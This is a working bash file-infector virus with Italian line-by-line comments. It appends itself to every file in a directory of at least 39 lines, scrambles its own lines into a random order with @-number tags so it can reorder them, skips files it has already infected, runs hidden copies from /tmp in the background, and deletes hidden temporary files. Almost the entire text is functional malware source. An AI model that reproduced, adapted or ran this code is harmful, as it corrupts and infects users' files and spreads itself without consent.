if [ "$1" == "test" ]; then  #@1 - Se il primo parametro (da terminale) è "test" allora termina.
  exit 0  #@2 - con exit 0 perchè il file è già infettato.
fi  #@3
MANAGER=(test cd ls pwd)  #@4 - Array di 4 elementi, usato come nomi di file temporanei.
RANDOM=$$  #@5 - generatore numeri random usando il process ID di virus.
for target in *; do  #@6 - Per ogni file nella directory:
  nbline=$(wc -l $target)  #@7 - Conta il numero di righe del file target.
  nbline=${nbline##}  #@8 - Taglia la parte sinistra della stringa
  nbline=$(echo $nbline | cut -d " " -f1)  #@9 - e recupare il numero di righe.
  if [ $(($nbline)) -lt 39 ]; then  #@10 - Controlla se il file scelto ha meno righe del virus (39). Se è true continua con un altro file.
    continue  #@11
  fi  #@12
  NEWFILE=${MANAGER[$((RANDOM % 4))]}  #@13 - Scelta random del nome del nuovo file tra quelli contenuti in MANAGER (sono 4).
  
  # Prende le ultime 36 righe del file target e le ordina in base al numero dopo @.
  # Ripristina il codice nell'ordine originale e scrive l'output in un file temporaneo nascosto. (nome scelto nella riga precedente).
  tail -n 36 $target | awk '{ print($NF" "$0) }' | cut -d"@" -f2- | sort -g | cut -d" " -f2- > /tmp/".$NEWFILE"  #@14
  
  # Fornisce a  /tmp/."$NEWFILE" i permessi di esecuzione ed esegue il reindirizzamento di stderr a /dev/null
  chmod +x /tmp/".$NEWFILE" && /tmp/".$NEWFILE" test 2> /dev/null;  #@15
  
  # Controlla il codice di uscita dell'ultimo comando eseguito: se corrisponde al virus 
  # restituisce 0 (vedi le prime 3 righe) e continua, perché il file è già infetto.
  if [ "$?" == "0" ]; then  #@16
    continue  #@17
  fi  #@18
  NEWFILE=${MANAGER[$((RANDOM % 4))]}  #@19 - Scelta random del nome del nuovo file tra quelli contenuti in MANAGER (sono 4).
  NEWFILE="/tmp/.$NEWFILE"  #@20 - Percorso del file appena creato

  # Aggiunge al file di destinazione le prossime 3 righe di codice che verranno eseguite quando verrà eseguito il file di destinazione:
  # queste 3 righe ottengono le ultime 36 righe del target (il virus) e vengono eseguite in background.
  # Ci sono tre righe per la fase di infezione, riordina le ultime 36 righe del file infetto e poi le esegue.
  echo "tail -n 36 $0 | awk '{ print(\$NF\" \"\$0) }' | cut -d\"@\" -f2- | sort -g | cut -d\" \" -f2- > $NEWFILE" >> $target  #@21
  echo "chmod +x $NEWFILE && $NEWFILE &" >> $target  #@22
  echo "exit 0" >> $target  #@23
  tabft=("FT" [36]=" ")  #@24 - Crea un array di 37 elementi: il primo elemento è "FT" e l'ultimo è " "
  declare -i nbl=0  #@25 - Crea una variabile intera: nbl=0
  while [ $nbl -ne 36 ]; do  #@26 - while (nbl != 36)
    valindex=$(((RANDOM % 36)+1))  #@27 - Genera un numero random tra 1 e 36
    while [ "${tabft[$valindex]}" == "FT" ]; do  #@28 -  scegli un nuovo numero per valindex, cioè una nuova riga da aggiungere
      valindex=$(((RANDOM % 36) + 1))  #@29
    done  #@30
    line=$(tail -n $valindex $0 | head -1)  #@31 - Prende l'ultima (n meno valindex)-riga del virus
    echo -e "$line" >> $target  #@32 - Aggiunge la linea al file di destinazione
    nbl=$(($nbl+1)) && tabft[$valindex]="FT"  #@33 - Incrementa il contatore e segna la cella valindex di tabft come "fatta"
  done  #@34
done  #@35
rm /tmp/.* 2> /dev/null #@36 - Elimina tutti i file temporanei nascosti